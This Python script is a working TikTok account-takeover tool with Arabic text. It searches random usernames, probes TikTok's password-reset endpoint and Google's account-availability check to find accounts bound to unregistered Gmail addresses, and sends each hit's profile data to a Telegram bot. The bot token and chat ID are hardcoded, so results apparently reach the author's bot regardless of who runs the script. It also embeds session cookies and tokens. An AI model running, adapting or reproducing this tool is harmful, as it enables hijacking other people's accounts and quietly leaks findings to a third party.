tokeen = "6690411516:AAE0HNICBTVTY3EwzZHW7nhMIaeqI_XTgPQ"
IDD = "1596296596"


import os,sys,subprocess
subprocess.getoutput("pip install requests")
import requests,sys,os,time


import os
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
output = render('V I P', colors=['red', 'white'], align='center')
print(output)
print(' \033[2;35m┏\033[2;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[2;32m┓')
import webbrowser
#webbrowser.open('https://t.me/QWz123QW')
import requests,random,os,uuid,json,sys,socket,datetime
from datetime import date
from time import sleep
from user_agent import generate_user_agent
from uuid import uuid4
import mechanize,time,threading
from os import system
import requests
from bs4 import BeautifulSoup
from datetime import datetime
def azz():
 azro = (f'''\033[2;31m⥲⥳⥲⥳⥲⥳\033[1;33m⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳\033[1;34m⥲⥳⥲⥳⥲⥳⥲⥳
\033[1;33m⦕ \033[1;34m⦲\033[1;33m ⦖\033[2;35m  Py : @S_LP5 
\033[2;35m⦕ \033[1;34m⦲\033[1;33m ⦖\033[2;32m  CH : @S_LP5 
\033[2;31m⥲⥳⥲⥳⥲⥳⥲\033[2;32m⥳⥲⥳⥲⥳⥲علو⥳⥲⥳\033[2;35m⥲⥳⥲⥳⥲⥳⥲⥳\n\n\n\n''')
 for azr in azro.splitlines():
  time.sleep(0.07)
  print(azr)
azz()
bb = 'qwertyuiopasdfghjklzxcvbnm12.34567890'
print('')
#tokeen = input(f' \033[2;32m(\033[2;35m🤨\033[2;32m) \033[1;33m 𝙏𝙊𝙆𝙀𝙉  ➪\033[2;32m  ')
print()
print(' ━━━━━━━━━━━━━━━━━━━━━ ')
print()
#IDD = input(f' \033[2;32m(\033[2;35m🔥\033[2;32m) \033[1;33m 𝙄𝘿 ➪\033[2;32m  ')
tlg1 = ("""
==================================
==================================

تـــم رمـي الـــســنـــارة انـتـظــر الــسـمـك يـا جـــورج ...

==================================
==================================
""")


requests.get("https://api.telegram.org/bot"+str(tokeen)+"/sendMessage?chat_id="+str(IDD)+"&text="+str(tlg1)) 
os.system('clear')
SS11=0
CLL=0
NICE=0
E1=0
j1=0
Ib=0
vv="123456789"
G = "\033[1;32m"
R = "\033[1;31m"
P = '\x1b[1;97m'
Y = '\033[1;34m' #ازرق فاتح
Ah = '\033[2;36m'#سمائي
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق

num=('456789')

ud = f'''https://www.tiktok.com/api/recommend/item_list/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F110.0.0.0%20Safari%2F537.36&channel=tiktok_web&clientABVersions=70508271%2C70830115%2C70863595%2C70894021%2C70919578%2C70941819%2C70971375%2C50070521%2C50077909%2C50089479%2C70405643%2C70455309&cookie_enabled=true&count={num}&device_id=7192801009189094918&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=3&is_fullscreen=false&is_page_visible=true&language=ar&os=windows&priority_region=''' '&referer=https%3A%2F%2Fwww.tiktok.com%2F&region=' '&root_referer=https%3A%2F%2Fwww.tiktok.com%2F&screen_height=768&screen_width=1366&tz_name=Asia%2FBaghdad&webcast_language=ar&msToken=_3_rCrJjvG3sTIkS5bcuUwUuYZcyBRnTQy4h7PNSsg3Xl2b3zjumI0bT60q-7GzCUHBJbw1_GwCuNM_oKqVpLam6MERqelG-WO4DfJgKAymiuTkQga8g2FTxPUPNEWwIPyPxcBOKdYqxtnjZ&X-Bogus=DFSzswVug-GANJPIShMnrcYklTI9&_signature=_02B4Z6wo00001KTSr-AAAIDBeqT3RSmF24ik0qtAAErYc3'
class DaddyGivt():
    def __init__(self,user):
        self.username =user
        if self.username[0] == "@" or "@" in self.username:
            self.username.replace("@", "")
        self.server_log = None
        self.data_json = None
        self.admin()

    def admin(self):
        self.send_request()
        self._to_json()
        self.output()

    def send_request(self):
        headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"}
        r = requests.get(f"https://www.tiktok.com/@{self.username}", headers=headers)
        self.server_log = str(r.text)
        return r.text

    def _to_json(self):
        try:
            soup = BeautifulSoup(self.server_log, 'html.parser')
            script = soup.find(id='SIGI_STATE').contents
            data = str(script).split('},"UserModule":{"users":{')[1]
            self.data_json = data
            return 1
        except IndexError:
            input("[X] Error : Username Not Found .")
            exit()

    def get_user_id(self):
        try:
            data = self.data_json
            return data.split('"id":"')[1].split('",')[0]
        except IndexError:
            return "Unknown"

    def get_name(self):
        try:
            data = self.data_json
            return data.split(',"nickname":"')[1].split('",')[0]
        except IndexError:
            return "Unknown"

    def is_verified(self):
        try:
            data = self.data_json
            check = data.split('"verified":')[1].split(',')[0]
            if check == "false":
                return "No"
            else:
                return "Yes"
        except IndexError:
            return "Unknown"

  
    def is_private(self):
        try:
            data = self.data_json
            check = data.split('"privateAccount":')[1].split(',')[0]
            if check == "true":
                return "Yes"
            else:
                return "No"
        except IndexError:
            return "Unknown"

    def followers(self):
        try:
            data = self.data_json
            check = data.split('"followerCount":')[1].split(',')[0]
            return check
        except IndexError:
            return "Unknown"

    def following(self):
        try:
            data = self.data_json
            check = data.split('"followingCount":')[1].split(',')[0]
            return check
        except IndexError:
            return "Unknown"


    def output(self):

        suii=f"""
==================================
==================================

𝙐𝙎𝙀𝙍𝙄𝘿➳ [ {self.get_user_id()} ]
𝙉𝙄𝘾𝙆𝙉𝘼𝙈𝙀➳ [ {self.get_name()} ]
𝙄𝙎 𝙑𝙀𝙍𝙄𝙁𝙄𝙀𝘿➳ [ {self.is_verified()} ]
𝙄𝙎 𝙋𝙍𝙄𝙑𝘼𝙏𝙀➳ [ {self.is_private()} ]
𝙁𝙊𝙇𝙇𝙊𝙒𝙀𝙍𝙎➳ [ {self.followers()} ]
𝙁𝙊𝙇𝙇𝙊𝙒𝙄𝙉𝙂➳ [ {self.following()} ]

==================================
==================================
"""
        tlg =(f'https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={IDD}&text={suii}')
        ru= requests.post(tlg)
def mmm():
 he3 = {
'user-agent': str(generate_user_agent()),
}
 zaid = requests.get('https://www.tiktok.com/',headers=he3)
 pr = zaid.cookies.get_dict()

 h = pr['ttwid']

 zaid = requests.get('https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
 pr = zaid.cookies.get_dict()
 u = pr['msToken']
 os.system('clear')
 global bb,vv,IIDDD,tokeeen,Ib,j1,E1,NICE,CLL,SS11,asu
 while True:     
  wk=int(''.join(random.choice(vv) for i in range(1)))
  username = str(''.join(random.choice(bb)for i in range(wk)))
  url=f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.8&browser_language=ar-EG&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7167115569976100357&device_platform=web_pc&focus_state=true&from_page=search&history_len=5&is_fullscreen=false&is_page_visible=true&keyword={username}&os=windows&priority_region=&referer=&region=IQ&screen_height=864&screen_width=1536&tz_name=Asia%2FBaghdad&webcast_language=ar&msToken=KUTYcDl8obce6sFgarFzTuyTp-uxz8sU5cFUq8fRme8gW7CZGE6IZyE04u9ugaO2fHPnE4oeSshscAF2kdNp43hjOfwbTaGSnH8ExR0LPs9VmBMkHykqXbOwL8XLgu3hMkdEin3jkM1d4ZBE&X-Bogus=DFSzswVLK1sANG9HSkI1-OYklT6o&_signature=_02B4Z6wo00001LRkx7AAAIDBahKfFq1mHTi0ZMMAAE696a'
  head11 = {
'accept': '*/*',
'accept-language':'ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
'cookie':'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent={"ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"}; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988={"user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"}; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,;tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFNICEIY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt=9392403db19bcfc1eb8eb48532fd8d5e; uid_tt_ss=9392403db19bcfc1eb8eb48532fd8d5e; sid_tt=5d52768f6a4a876314ea37244edfd0d0; sessionid=5d52768f6a4a876314ea37244edfd0d0; sessionid_ss=5d52768f6a4a876314ea37244edfd0d0; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+h+';odin_tt=70015f10b12827e4d2b9cce32ead78da9CLLf5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+u+'; msToken='+u+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
'referer': 'https://www.tiktok.com/search/user?q=its.veba&t=1671705430400',
'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
  y= requests.get(url,headers=head11).json()
  try:
   iddd = len(str(y['user_list'][0]['user_info']['unique_id']))
   for ll in range(0,iddd):
    try:
     nn = str(y['user_list'][ll]['user_info']['unique_id'])
     email = nn+'@gmail.com'
     url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1emw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
     headers = {
            'host':'api2-19-h2.musical.ly',
            'connection':'keep-alive',
            'cookie':'sstore-idc=maliva; store-country-code=iq; odin_tt=056f31c10f8c82638f6d4d64669ad49e9c36d4946d5d596f433d7f2d75fa1592a21c201d712196d54ee4ae4e14ac8708eee32dc97c85c0a65510024ecc0698346f73ecab038b7160dbff96ced716b8af',
            'accept-Encoding':'gzip',
             'user-agent':'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ; SM-A022F; Build/RP1A.200720.012; Cronet/58.0.2991.0)',
              'connection': 'close',}
     data = f"app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233"
     re = requests.post(url,headers=headers,data=data)
     if 'Bind device by email failed' in re.text:
      os.system('cls'if os.name=='net'else'clear')
      SS11 += 1
      print(f'''
    \033[2;32m⦕ \033[2;34m𝙏𝙄𝙆 𝙏𝙊𝙆 𓅔\033[2;32m ⦖
\033[1;31m⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳
\033[2;32m⦕ \033[2;34m🏴‍☠️\033[2;32m ⦖ \033[2;32m    𝗚𝗔𝗗 𝗧𝗜𝗞 𝗧𝗢𝗞   \033[2;34m⸎ \033[1;33m﴾\033[2;32m{NICE}\033[1;33m﴿
\033[2;32m⦕ \033[2;34m🏴‍☠️\033[2;32m ⦖ \033[1;31m𝘽𝘼𝘿 𝙂𝙈𝘼𝙄𝙇 \033[2;34m⸎ \033[1;33m﴾\033[1;31m{SS11}\033[1;33m﴿
\033[1;31m⦕ \033[2;34m🏴‍☠️\033[1;31m ⦖ \033[1;33m𝘽𝘼𝘿 𝙏𝙄𝙆 𝙏𝙊𝙆 \033[2;34m⸎ \033[1;33m﴾\033[2;31m{CLL}\033[1;33m﴿
\033[1;33m⦕ \033[2;34m⦲\033[1;33m ⦖\033[2;32m  Ch : @S_LP5 \033[2;34m⸎ 
\033[1;33m⦕ \033[2;34m⦲\033[1;33m ⦖\033[2;32m  Py \033[2;34m⸎ @S_LP5
\033[1;31m⥲⥳⥲⥳⥲⥳⥲علو⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳    
''')
      
     elif 'Sent successfully' in re.text:
      headers = {
           'Content-Length':'98',
           'Content-Type':'text/plain; charset=UTF-8',
           'Host':'android.clients.google.com',
           'Connection':'Keep-Alive',
           'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
      }
      data = json.dumps({'username':f'{email}',
           'version':'3',
           'firstName':'MATASL',
           'lastName':'Codeing'})
      res=requests.post('https://android.clients.google.com/setup/checkavail',headers=headers,data=data)
      if res.json()['status'] =='USERNAME_UNAVAILABLE':
       os.system('cls'if os.name=='net'else'clear')
       CLL += 1
       print(f'''
    \033[2;32m⦕ \033[2;34m𝙏𝙄𝙆 𝙏𝙊𝙆 𓅔\033[2;32m ⦖
\033[1;31m⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳
\033[2;32m⦕ \033[2;34m🏴‍☠️\033[2;32m ⦖ \033[2;32m    𝗚𝗔𝗗 𝗧𝗜𝗞 𝗧𝗢𝗞   \033[2;34m⸎ \033[1;33m﴾\033[2;32m{NICE}\033[1;33m﴿
\033[2;32m⦕ \033[2;34m🏴‍☠️\033[2;32m ⦖ \033[1;31m𝘽𝘼𝘿 𝙂𝙈𝘼𝙄𝙇 \033[2;34m⸎ \033[1;33m﴾\033[1;31m{SS11}\033[1;33m﴿
\033[1;31m⦕ \033[2;34m🏴‍☠️\033[1;31m ⦖ \033[1;33m𝘽𝘼𝘿 𝙏𝙄𝙆 𝙏𝙊𝙆 \033[2;34m⸎ \033[1;33m﴾\033[2;31m{CLL}\033[1;33m﴿
\033[1;33m⦕ \033[2;34m⦲\033[1;33m ⦖\033[2;32m  Py : \033[2;34m⸎ @S_LP5
\033[1;33m⦕ \033[2;34m⦲\033[1;33m ⦖\033[2;32m  CH: \033[2;34m⸎ @S_LP5
\033[1;31m⥲⥳⥲⥳⥲⥳⥲علو⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳    
''')

      elif res.json()['status'] =='SUCCESS':
      
       NICE += 1
       print(f'''
    \033[2;32m⦕ \033[2;34m𝙏𝙄𝙆 𝙏𝙊𝙆 𓅔\033[2;32m ⦖
\033[1;31m⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳
\033[2;32m⦕ \033[2;34m🏴‍☠️\033[2;32m ⦖ \033[2;32m    𝗚𝗔𝗗 𝗧𝗜𝗞 𝗧𝗢𝗞   \033[2;34m⸎ \033[1;33m﴾\033[2;32m{NICE}\033[1;33m﴿
\033[2;32m⦕ \033[2;34m🏴‍☠️\033[2;32m ⦖ \033[1;31m𝘽𝘼𝘿 𝙂𝙈𝘼𝙄𝙇 \033[2;34m⸎ \033[1;33m﴾\033[1;31m{SS11}\033[1;33m﴿
\033[1;31m⦕ \033[2;34m🏴‍☠️\033[1;31m ⦖ \033[1;33m𝘽𝘼𝘿 𝙏𝙄𝙆 𝙏𝙊𝙆 \033[2;34m⸎ \033[1;33m﴾\033[2;31m{CLL}\033[1;33m﴿
\033[1;33m⦕ \033[2;34m⦲\033[1;33m ⦖\033[2;32m  Py : \033[2;34m⸎ @S_LP5
\033[1;33m⦕ \033[2;34m⦲\033[1;33m ⦖\033[2;32m  CH : \033[2;34m⸎ S_LP5
\033[1;31m⥲⥳⥲⥳⥲⥳⥲علو⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳⥲⥳    
''')

       user = email.split("@gmail.com")[0]
       DaddyGivt(f'{user}')
       
       ru= requests.post(tlg)
       exit()
       break
    except IndexError:
     pass
  except IndexError:
   pass
while True:   
 Threads=[] 
 for t in range(7):
  x = threading.Thread(target=mmm)
  x.start()
  Threads.append(x)
 for Th in Threads:
  Th.join()
else:
    print('تاكد من الانترنت  او تم توقيف الادات من قبل المطور راسل المطور وقم بتفعيل اشتراك ع كد فلوسك')
